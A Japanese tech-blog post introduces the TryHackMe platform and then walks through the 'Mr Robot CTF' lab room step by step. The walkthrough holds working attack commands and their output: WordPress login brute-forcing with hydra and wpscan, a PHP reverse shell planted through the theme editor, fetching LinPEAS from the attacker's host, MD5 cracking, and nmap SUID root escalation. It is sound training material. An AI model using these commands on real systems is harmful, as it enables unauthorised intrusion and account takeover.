---
title: TryHackMe でセキュリティを気軽に学ぶ
date: 2024/10/30 00:00:00
postid: a
tag:
  - HackTheBox
category:
  - Security
thumbnail: /images/2024/20241030a/thumbnail.png
author: 島ノ江励
lede: TryHackMe に関するブログや、最近このようなセキュリティ系の記事が無かったこと、最近私も TryHackMe に課金して利用していることから、今回このテーマで記事を書こうと思い寄稿しました。

---
[秋のブログ週間2024](/articles/20241028a/) ３本目です。

## はじめに

ペンギンになりたいエンジニアの島ノ江です。普段は Cyber Security Innovation Group というセキュリティチームに所属していて、[FutureVuls](https://vuls.biz/lp/) という脆弱性管理サービスの開発・営業をしています。

本記事では以下の内容を扱います：

- セキュリティ学習プラットフォームについて
- TryHackMe のサービス概要
- HackTheBox との比較
- 実際に Room を攻略してみる（Walkthrough）

## セキュリティ学習プラットフォームについて

脆弱性は「攻撃」と「防御」という言葉を伴います。ハッカーは外部組織の脆弱性を突いて、ランサムウェアによる身代金の要求や情報漏洩などの攻撃をしかけます。逆に組織のセキュリティチームは様々な手法で攻撃を検知・防御し、組織の情報資産を安全に守るよう努めます。

このような脆弱性の攻撃や防御の手法について、例えば SQL Injection や XSS などの用語を、基本情報技術者試験や参考書などで見かけることがあると思います。しかし、これらの技術を試してみるという実践経験はなかなか積めず、知識で留まっていることは多いと思います。

<div class="note alert" style="background: #feebee; padding:16px; margin:24px 12px; border-radius:8px;"><span class="fa fa-fw fa-check-circle"></span>

悪用の意図の有無によらず、他社の所有するサーバへ上記のような攻撃行為を試行することは「[不正アクセス行為の禁止等に関する法律](https://www.soumu.go.jp/main_sosiki/cybersecurity/kokumin/basic/legal/09/)」などに抵触する恐れがあります。絶対にやめましょう。

</div>

そのようなお悩みを解決するために、安心安全にサイバーセキュリティのスキルを向上させることができるオンライン学習プラットフォームの１つが [TryHackMe](https://tryhackme.com/) です。

よく比較される類似サービスに [HackTheBox](https://www.hackthebox.com/) があります。技術ブログでは過去に HackTheBox の問題を解いてみた記事がありました（[参考](/articles/20230425a/)）。

しかし TryHackMe に関するブログや、最近このようなセキュリティ系の記事が無かったこと、最近私も TryHackMe に課金して利用していることから、今回このテーマで記事を書こうと思い寄稿しました。

## サービスの概要紹介

TryHackMe には無料で利用できる Room があります。有料プラン（月間or年間）を契約してより深く学習していくこともできます。

TryHackMe は大きく Learn と Practice に分かれています。Learn は 

- **Module**：Nmap などのツールや暗号技術などの概念を学ぶ Room の集まり
- **Learning Path**：特定の目的に沿って一連の Module に取り組む学習コース

からなります。Learning Path で１つずつステップアップすることも、Module 単位でツールをつまみ食いすることもできます。以下の画像は Learning Path の一部です。Penetration、SOC、Red Teaming などがあります。

<img src="/images/2024/20241030a/image.png" alt="" width="1200" height="671" loading="lazy">

Module は いくつかの Room で構成されています。各 Room ではツールの概要やオプションについての解説があり、その後学んだ内容を活かして Question に回答していきます。
例として、後の Walkthrough でも登場する「[Hydra](https://tryhackme.com/r/room/hydra)」というツールの Room を見てみます（これは [Offensive Security Tooling](https://tryhackme.com/module/offensive-security-tooling) という Module に含まれています）。

<img src="/images/2024/20241030a/image_2.png" alt="" width="1188" height="829" loading="lazy">

`Task 1`（Hydra Introduction）では Hydra というツールの概要が紹介されています。その後の `Task 2`（Using Hydra）で、この Hydra を使って実践的な学習をしていきます。「Start Machine」のボタンを押すと、ツールで攻撃をしても問題ない仮想サーバが立ち上がり、実際に Hydra などのツールを試すことができます。
学んだ内容を元に、指示に従ってツールを実行、Question で指定されている flag を狙います（このような攻略対象のサーバに隠された flag を取得するコンテストが CTF(Capture The Flag)です）。Question 全部に正解すれば、その Room はクリアです！

<img src="/images/2024/20241030a/image_3.png" alt="" width="1140" height="239" loading="lazy">

TryHackMe にはブラウザ上で仮想環境を作れる [AttackBox](https://help.tryhackme.com/en/articles/6721845-the-attackbox-explained) という機能もあるので、Windows ユーザなどでも学習したコマンドをブラウザでちょっと試す、ということが可能です。なお、VirtualBox などでローカルに環境を構築し、VPN 接続する方法もあります。

このように、各ツールについてかなり基礎的なところから、実際に手を動かして学ぶことができるようになるのが TryHackMe の特長だと思います。

## TryHackMe の良い点と HackTheBox との比較

### TryHackMe の良い点

- Learning Path が整備されていて、各種ツールの使い方を個別に学べる Room がある
  - 個人的にはここがよく、学習ハードルを大きく下げてくれて継続しやすいと思います
  - 普段業務で触れていない内容を、業務終わりなどに自分で調べて学習していくのは、興味があるといえど負荷が高いです
  - Practice で詰まったときも、「分からなくなったらここに戻ってこよう」と考えて気楽に取り組めます
- Linux の CLI 練習や Windows の基本、TCP/IP の仕組みなど、かなり基礎的な内容も扱っています
  - この辺は特に未経験の新人の方には嬉しい内容だと思います
  - 既に知っている内容はスキップしたり、英語で学習する機会として利用できます 
- 深く学習するには有料プランの契約が必要ですが、年末には年間プランが20%引きになるキャンペーンもやっており、お得に始められます

### HackTheBox の良い点

メインテーマから外れるのと TryHackMe より利用していないので、参考程度で。

- より高難度な技術や問題は HackTheBox の方が多いように思います
  - 完全上位互換ではないです
  - より技術を深く理解したい場合は HackTheBox の方が良さそうです

私個人の感想としては、勉強になぞらえると

- TryHackMe は教科書+章末問題・問題集
- HackTheBox は参考書・問題集

のような感覚です。初めてこの世界に触れるのであれば、難易度・とっつきやすさから TryHackMe が個人的には良いと思います。TryHackMe で基礎的な知識を習得したので次のステップに進みたい、または基礎的な部分は自分で調べられる、という人は HackTheBox を選択すると良いでしょう。

## Walkthrough の前に軽くまとめ

せっかくなので TryHackMe の Practice にある Room をこの後攻略していきます。CTF には Walkthrough という、自分がどのように解いていったのかを書いて発信する文化があります。解き終わった後に他の人の手順を読むと、新たな発見や知識を得られることがあります。

この後の Walkthrough は、CTF を知らないと読むのが大変かもしれないです。流し読みでも良いと思うので、「脆弱性が存在するとこんなことが簡単にできるのか」「CTF面白いな」「セキュリティについて知らないで実装するの怖いな」といった感想を抱いてもらえるだけでも嬉しいです。

ネットワークやセキュリティの活きた知識を駆使しながらパズルを解いていくのが CTF の楽しさかなと思います。私もまだ CTF を初めて少ししか経っていないので、知らない知識は山ほどありますし、Room 攻略が全然できないときは悔しく感じます。しかし、Lerning Path での学習では、普段業務では得られない知識も得られ、実際に Room で覚えたことを使って先に進めたときは新鮮な気持ち良さを感じられます。パズルや研究が好きな人には向いているかもしれません。

私は新卒入社での研修後、いきなりセキュリティのチームに配属されました。私もその一人でしたが、馴染みのない人は「セキュリティ系の人たちって普段どんなことしてるんだ？」という疑問を抱くことがあると思います。その点で、 CTF はサイバー攻撃での攻撃・防御を学習する1つの手法として、セキュリティを身近に感じられるものだと思います（もちろん、セキュリティ系の業務は他にも山ほどあります）。「少し新しい世界に触れてみよう」くらいの軽い気持ちででも、CTF を始めてもらえたら幸いです（そして私と一緒に勉強会をしましょう。仲間募集中です。）

先日、株式会社ラック様が公開している「[サイバーセキュリティ仕事ファイル](https://www.lac.co.jp/lacwatch/announce/20231106_003557.html)」という資料を拝読しました。セキュリティ系の仕事にはどのようなものがあるのか、どのような業務を行っているのか、などを広く知ることができました。上述のような疑問を抱いている方々の参考になれば幸いです。

---

では、ここからは Learning から Practice に移り、実際のサーバ攻略をしていきます。
Linux や CTF に馴染みのない方は、ここから先は読み流す程度でも構いません。

## Room 情報

今回は難易度が Medium のこちらの [Mr Robot CTF](https://tryhackme.com/r/room/mrrobot) の Room を攻略していきます。
使用している環境は、VirtualBox 上に構築した Kali Linux で、`~/tryhackme/MrRobotCTF` という作業ディレクトリ上で作業しています（AttackBox 上ではなく、`openvpn` で接続しています）

```sh
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ cat /proc/version  
Linux version 6.8.11-amd64 (devel@kali.org) (x86_64-linux-gnu-gcc-13 (Debian 13.2.0-25) 13.2.0, GNU ld (GNU Binutils for Debian) 2.42) #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30)
```

### Walkthrough

<img src="/images/2024/20241030a/image_4.png" alt="" width="1048" height="655" loading="lazy">

Questions は3つありますが、どれも `What is key 1?` といった形式で、特に調べる場所のヒントはなさそうです。

::: note warn
Walkthrough の途中で IP の値が変わっています。これは時間を跨いだせいで、サーバが再起動したためです。Walkthrough だけ読むとスラスラと解いてるように見えるかもしれませんが、裏では試行錯誤したり情報を調べたりと、ずっと多くの時間がかかってます。
ああ、苦戦したんやな（笑）と思ってください。
:::

---

まずは恒例 `nmap` でターゲットの偵察をしていきます。

::: note info
使用コマンドは使ってるうちに段々と慣れて覚えられます。忘れた場合は潔く参考書を開いたりネットで調べます。どのようなツールがあり、それで何ができるのかを覚えておくことが大事で、あとは適宜 option を調べてなんとかなります。
:::

```sh
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ nmap -sV -Pn -oN nmap.txt -v 10.10.203.195
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 18:44 JST
（中略）
Nmap scan report for 10.10.203.195
Host is up (0.43s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

```

偵察の結果、以下のことが分かりました。

1. ssh の port(22) が closed になっている
2. http の port(80) が open になっている
3. ssl/http の port(443) が open になっている

ひとまず http に chrome からアクセスしてみます。
すると、かっちょいい画面が起動しました。シェルにカタカタと文字が入力され、映画のようなわくわく感があります。しばらくするとコマンドの入力を促されました。

<img src="/images/2024/20241030a/MrRobotCTF_http.png" alt="MrRobotCTF_http.png" width="1200" height="524" loading="lazy">

とりあえずコマンドを入れてみます。しかし `id` や `ls` 、`pwd` など基本的な Linux コマンドは使えなさそうです（`Command not recognized. Type help for a list of commands.` と表示されます）

じゃあ上から順にいくしかないか... ということで、最初の `prepare` を実行。するとまた別の映像が流れ始めます。
でもよくわからない。developer tool を覗いてみたが、`YOU ARE NOT ALONE` というメッセージが出ているだけでまだ何も分からない。「WE ARE FSOCIETY」って一体なんでしょうか...

<img src="/images/2024/20241030a/MrRobotCTF_movie.png" alt="MrRobotCTF_movie.png" width="1200" height="626" loading="lazy">

次の `fsociety` を実行してみます（最初のログイン画面にも出てた単語なので気になります）。すると `/fsociety` のパスに移動して動画が流れました。画像は省略しますが、`ARE YOU READY TO JOIN FSOCIETY?` というまたしてもよくわからないメッセージが出ます。同じく他のコマンドでも、パスが切り替わり動画や写真が出てくるが、ぱっと見で使える情報はなさそうですね。攻略後に種明かしができると信じて、いったんスルーします。

公開されている情報の中には使えそうなものはありませんでした。次に、Web サイトに他の公開情報がないかを調べてみます。`gobuster` や `dirb` というツールで調べられますが、`gobuster` の方が高速に動作してくれるのでこちらを使います（某ゴースト退治の映画っぽさもあって好きです）。wordlist（パスの候補となる単語集）に common.txt を使って調査。

```sh
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ gobuster -o gobuster.txt dir -u http://10.10.203.195 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.203.195
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.10.203.195/0/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.203.195/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.203.195/feed/atom/]
/audio                (Status: 301) [Size: 235] [--> http://10.10.203.195/audio/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.203.195/blog/]
/css                  (Status: 301) [Size: 233] [--> http://10.10.203.195/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.203.195/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.203.195/feed/]
/image                (Status: 301) [Size: 0] [--> http://10.10.203.195/image/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.203.195/Image/]
/images               (Status: 301) [Size: 236] [--> http://10.10.203.195/images/]
/index.html           (Status: 200) [Size: 1077]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.203.195/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.203.195/js/]
Progress: 2216 / 4615 (48.02%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.10.203.195/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.203.195/]
/phpmyadmin           (Status: 403) [Size: 94]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.203.195/feed/rdf/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.203.195/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.203.195/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 235] [--> http://10.10.203.195/video/]
/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.203.195/wp-admin/]
/wp-config            (Status: 200) [Size: 0]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.203.195/wp-content/]
/wp-cron              (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.203.195/wp-includes/]
/wp-load              (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-login             (Status: 200) [Size: 2671]
/wp-mail              (Status: 500) [Size: 3064]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.203.195/wp-login.php?action=register]
/wp-settings          (Status: 500) [Size: 0]
/xmlrpc.php           (Status: 405) [Size: 42]
/xmlrpc               (Status: 405) [Size: 42]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

色々とパスが見つかりました。robots.txt（隠したいファイル名を記載することでクローラの検索から除外できるファイル） が見えるので cat してみましょう。

```sh
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ curl 10.10.203.195/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

1つ目の key が見つかりました。このパスに移動すれば key をゲットです。

併せて `fsocity.dic` という気になるファイルもあります。`.dic` というのはバイナリ形式の辞書ファイルらしいです。（ちなみに、あとでブルートフォース攻撃をするタイミングがあり、このファイルを使います）。

`/readme` を覗くと以下のような内容が書かれていました。

```txt
I like where you head is at. However I'm not going to help you.
（意訳：とっかかりの考え方としてはイイね。でもお助けは無しだ。）
```

煽られました（笑）。CTF ではこの手の煽り文句を見つけられることがあります。出題者が「見つけてくれるかな？」と埋め込んだ隠しネタを見つけたときは嬉しいですね。

さらに探索を続けてみます。gobuster の結果を見るに、これは WordPress で構築されているようです。
ひとまず `301` のそれっぽい `/wp-admin` のパスを見に行ってみます。するとログインページにリダイレクトされました。

<img src="/images/2024/20241030a/MrRobotCTF_wp.png" alt="MrRobotCTF_wp.png" width="1200" height="627" loading="lazy">

認証回り、SQL Injection を狙えるかなという期待を抱きつつ、ひとまずダミーデータで認証の挙動を確認してみます。 `Username: test, Password: password` の情報で認証をトライ（画像を載せてませんが、パスワードを入れないと `ERROR: The password field is empty.` というエラーが出ました）すると、 `ERROR: Invalid username. Lost your password?` という**親切な**エラーメッセージが。`Username` のフィールドが異なるようですね。

<img src="/images/2024/20241030a/MrRobotCTF_login.png" alt="MrRobotCTF_login.png" width="1200" height="627" loading="lazy">

::: note info
以下でやるように、「`Username` が異なります」 という詳細なエラーを返すと、「`Username` が正しいか」という判断が可能になり、ブルートフォース攻撃が可能となる脆弱性を埋め込むことになります。
「`Username` または `Password` が異なります」や「認証情報が違います」といった汎用的な表現に留めましょう。
:::

developer tool で確認してみると、`log: test, pwd: password` というパラメータで POST していることが分かりました。
この `log` の候補となる情報がないか調べてみます。

ブルートフォース攻撃をしたくなったので、先ほど見つけた辞書ファイル `fsocity.dic` を取得してきます。しかしこのファイル、やけに重い。ダウンロードに2分もかかってます。確認すると 7.0 MB もあります。

```sh
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ curl -O http://10.10.203.195/fsocity.dic 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7075k  100 7075k    0     0  63412      0  0:01:54  0:01:54 --:--:--   97k

┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ du -h fsocity.dic 
7.0M    fsocity.dic

```

このまま攻撃に使うと時間がかかるので、中身を `less` で確認してみます。すると、辞書ファイルに重複する内容が多いことに気が付きます。調べると、全単語が 75 行ずつ重複して存在するようです。

```sh
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ sort fsocity.dic | uniq -c | head -n 3
     75 000
     75 000000
     75 000080
```

そのまま使うのは時間の無駄なので圧縮します。すると 96 KB まで圧縮できました（約75分の1）

```sh
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ sort fsocity.dic| uniq > fsocity_uniq.dic
                           
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ du -h fsocity_uniq.dic 
96K     fsocity_uniq.dic
```

では攻撃をしていきます。 `hydra` というブルートフォース攻撃ができるツールで調べます。まずは `pwd:test` で固定、コマンドは[こちら](https://qiita.com/v_avenger/items/fc054e985e79e6eddb4d)を参考にしました。実行には25分かかりましたが、気長に待ちましょう。

```sh
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ hydra -L ./fsocity_uniq.dic -p test 10.10.203.195 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.203.195%2Fwp-admin%2F&testcookie=1:F=Invalid username'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-27 20:39:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
[DATA] attacking http-post-form://10.10.203.195:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.203.195%2Fwp-admin%2F&testcookie=1:F=Invalid username
[STATUS] 445.00 tries/min, 445 tries in 00:01h, 11007 to do in 00:25h, 16 active
[STATUS] 416.33 tries/min, 1249 tries in 00:03h, 10203 to do in 00:25h, 16 active
[STATUS] 446.86 tries/min, 3128 tries in 00:07h, 8324 to do in 00:19h, 16 active
[STATUS] 454.92 tries/min, 5459 tries in 00:12h, 5993 to do in 00:14h, 16 active
[80][http-post-form] host: 10.10.203.195   login: Elliot   password: test
[80][http-post-form] host: 10.10.203.195   login: elliot   password: test
[80][http-post-form] host: 10.10.203.195   login: ELLIOT   password: test
[STATUS] 448.71 tries/min, 7628 tries in 00:17h, 3824 to do in 00:09h, 16 active
[STATUS] 447.82 tries/min, 9852 tries in 00:22h, 1600 to do in 00:04h, 16 active
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-27 21:04:42
```

`Elliot`, `elliot`, `ELLIOT` という3つの `Username` が正しいものとわかりました。大文字小文字の区別はしていないようです。
試しに `Elliot` でログインしようとすると、`ERROR: The password you entered for the username Elliot is incorrect. Lost your password?` というまたしても**親切な**エラーが返ってきます。

パスワードについてもブルートフォース攻撃で調べられそうです。今回はこのサイトが WordPress のものとわかっているので、これに特化した `wpscan` というツールを使います。

```console
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ wpscan --url http://10.10.203.195 -U Elliot -P fsocity_uniq.dic -t 32
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
(中略)

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot / ER28-0652                                                                                                 
All Found                                                                                                                      
Progress Time: 00:00:49 <=====================================                                > (12 / 22) 54.54%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652
```

パスワードが分かりました。得られた認証情報でログインしてみます。

<img src="/images/2024/20241030a/MrRobotCTF_Elliot_Login.png" alt="MrRobotCTF_Elliot_Login.png" width="1200" height="621" loading="lazy">

ログインに成功しました！まずは WordPress のサイトへの侵入成功です。画面で触れる箇所が多く、調べたら色々と情報や脆弱性が出てきそうです。今回ログインしたユーザは Elliot Alderson さんという方のようです。メールアドレスや顔写真などの個人情報も出てきました。怖いですねぇ。

次は更に内部に入りこむべく、この WordPress サーバ（OS側）への侵入を試みます。WordPress 上を探索してみると、`Appearance > Editor` に php のコードが色々とあり、編集ができることに気が付きます。リバースシェルを仕込んで実行させることで、シェルを取得できそうです。

<img src="/images/2024/20241030a/MrRobotCTF_editor.png" alt="MrRobotCTF_editor.png" width="1200" height="625" loading="lazy">

::: note info
**リバースシェル**は、ターゲットから自分のローカルマシンに向けた接続を行う仕組みです。サーバは基本的に外部から内部への通信は厳しく制限しますが、内部から外部への通信は比較的ゆるい場合が多いです。
そこで、ローカルマシンではあるポート（今回は`12345`） で接続を Listen しておきます。ターゲットマシンに侵入後、リバースシェルのプログラムにこのIP・ポートへ接続する設定をして、このプログラムが実行されるように仕込みます。プログラムが実行されると、ローカルマシンへの接続が発生して、ターゲットマシンのシェルを取得できます。
:::

Kali にもともとある php のリバースシェルのスクリプトをコピーしてきます（ちなみに私は php のコードは読めません...）

```sh
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
```

ファイルの中身で「CHANGE THIS」とコメントされている箇所が2か所あるので、そこを変更します。 `$ip(自分のローカルマシンのIP)` と `$PORT(適当に12345)` を設定し、保存します。編集したプログラム全体をべろっとコピーして、`404.php` を更新します。`File edited successfully.` と出て無事に更新完了です。

ローカルマシン で別タブを開き、 port 12345 で Listen しておきます（`nc -lnvp 12345`）。その状態で、ブラウザで `/404.php` にアクセスすると... WordPress サーバのシェルを取得できました！（`whoami` で daemon と出てますね）

<img src="/images/2024/20241030a/MrRobotCTF_shell.png" alt="MrRobotCTF_shell.png" width="1200" height="429" loading="lazy">

`cat /etc/passwd` で他にどのようなユーザがいるのか調べます。`robot` というユーザは問題名からしても気になりますね。

```sh
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
(中略)
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
```

robot に探りを入れてみると、2つ目の key を発見しました。しかし、key の参照権限はファイル所有者の robot しかないようです。

```sh
$ ls -l /home/robot/
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
```

でも `password.raw-md5` という気になる名前をしたファイルは、その他のユーザにも参照権限があるようです。

```sh
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

MD5 とはハッシュ関数の１つで、128bitのハッシュ値を生成します。しかし、MD5 には比較的簡単にハッシュ衝突を計算できるという脆弱性があり、安全性の観点から暗号化には利用されません。

このようなパスワードの解読には `JohnTheRipper` というツールが使えます。`password.raw-md5` の中身を `md5.txt` というファイルに保存して、 JohnTheRipper で解読してみると、一瞬でパスワードを取得できました。

```sh
┌──(kali㉿kali)-[~/tryhackme/MrRobotCTF]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)     
1g 0:00:00:00 DONE (2024-10-27 22:21) 10.00g/s 405120p/s 405120c/s 405120C/s bonjour1..123092
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

robot ユーザでログインを試みます。が、terminal から実行してねと怒られました（シェルを取得した際にも、tty にアクセスできないと出てましたね）。

```sh
$ su - robot
su: must be run from a terminal
```

そこで、ログインできるよう新たにシェルを立ちあげます。Python コマンドが実行できそうなので、以下のようにシェルを立ち上げるコマンドを実行します。その後またログインしてみると、 robot ユーザでログインに成功しました！
これで `key-2-of-3.txt` もゲットできます。

```sh
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su - robot
su - robot
Password:  

$ whoami
whoami
robot
```

robot ユーザでのログインに成功したので、次は権限昇格を狙います。

::: note info
このように、取得したログイン情報を足掛かりにして別のアカウントへ侵入することを横展開やラテラルムーブメントなどと呼びます。上位の権限を取得できる場合は権限昇格と呼びます。
:::

robot では sudo でのコマンド実行はできないようです。

```sh
$ sudo -l
sudo -l
[sudo] password for robot:

Sorry, user robot may not run sudo on linux.
```

そこで、 `LinPEAS` というツールを使って、特権昇格に使えそうな設定不備がないかを調べてみます。

::: note info
[LinPEAS](https://github.com/peass-ng/PEASS-ng) は侵入後に特権昇格を狙うための設定不備がないかを表示してくれる強力なツールです。シェルを取得できている場合、スクリプトを持ってくるだけで実行でき、様々な情報を見やすい形で表示してくれます。マスコットがかわいいのに、強力で恐ろしい。
:::

ローカルマシンで別タブを開き、 `cp /usr/share/peass/linpeas/linpeas.sh .` でスクリプトをコピーしてきます。ターゲットマシンで取得したいので `python3 -m http.server 12346` でサーバを起動します。

ターゲットマシンからローカルマシンのIPとポートを指定して `wget` でアクセスし、スクリプトを取得します（なお、`/home/robot` 配下では書き込み権限がなくエラーになったので、 `/tmp` に移動しています）

`linpeas.sh` に実行権限を付与したら、これを実行して脆弱性を探してみます。

```sh
$ wget 10.4.108.90:12346/linpeas.sh
wget 10.4.108.90:12346/linpeas.sh
--2024-10-27 14:43:42--  http://10.4.108.90:12346/linpeas.sh
Connecting to 10.4.108.90:12346... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827739 (808K) [text/x-sh]
Saving to: ‘linpeas.sh’

100%[======================================>] 827,739      354KB/s   in 2.3s   

2024-10-27 14:43:45 (354 KB/s) - ‘linpeas.sh’ saved [827739/827739]

$ chmod +x linpeas.sh

$ ./linpeas.sh | tee linpeas_output.txt

```

すると、ごろごろと脆弱性が出てきます。ざーっと結果を読んでいくと、特に SUID に関する部分で、`nmap` を用いた脆弱性があることが見つかりました（LinPEAS は画像のように色付きで注目箇所が分かりとても便利です）

<img src="/images/2024/20241030a/MrRobotCTF_suid.png" alt="MrRobotCTF_suid.png" width="1200" height="574" loading="lazy">

「nmap SUID」と検索したら出てきた[こちらのサイト](https://gtfobins.github.io/gtfobins/nmap/)によると、バージョン 2.02～5.21 の間では、`nmap` には `--interactive` というオプションがあるようです。`nmap --interactive` を実行すると、root 権限のシェルにアクセスできるようです（恐ろしい！）
シェルに入って、`!ls /root` を実行したら最後の key3-of-3.txt もゲットできました。Root 権限でのシェルも手に入れたので、これにて Room 攻略完了です！お疲れさまでした！！

```sh
$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !ls /root 
!ls /root
firstboot_done  key-3-of-3.txt
```

### 攻略の整理

今回のフラグ獲得の手順と使ったツールをまとめます。Easy で出てくる一般的なツールを駆使して解き進めるので、比較的とっつきやすい Room だったと思います。

1. ポートスキャンで偵察（`nmap`）
2. Web サイトの調査（`gobuster`）
3. WordPress サイトの調査（`hydra`, `wpscan`）
4. 初期侵入の実施（reverse shell）
5. 権限昇格の調査（`JohnTheRipper`, LinPEAS）
6. 権限昇格の実行（`nmap --interactive`）

### 攻略後談

今回の Room は 2015 年にアメリカで大ヒットを記録した「Mr. Robot」というドラマが元ネタのようです。有料ですが、字幕版が [Prime Video](https://www.amazon.co.jp/gp/video/detail/B015NZFF8I) で公開されていますね。有志による [Wiki](https://mrrobot.fandom.com/wiki/Mr._Robot_Wiki) も公開されていて、物語やキャラの情報も色々と知ることができます。

攻略の途中で出てきた単語は以下のような繋がりがあるようです。

- Elliot というユーザ名は、このドラマに登場する主人公、天才ハッカーのエリオット・オルダーソン
- Mr. Robot は世界最大の利権企業を崩壊させようと目論む革命家
- fsociety は Mr. Robot やエリオットが率いるハッカー集団の名称

ドラマのテーマや概要を知ると、最初 http で接続したときに表示された画像や動画の意味が分かるようになりました。ドラマを見たらさらに理解が進みそうですね。
CTF には今回のような元ネタがある Room もあるので、攻略後に調べると「へ～」という発見がって面白い点です。

以上で Walkthrough 、そして本ブログを終えます。
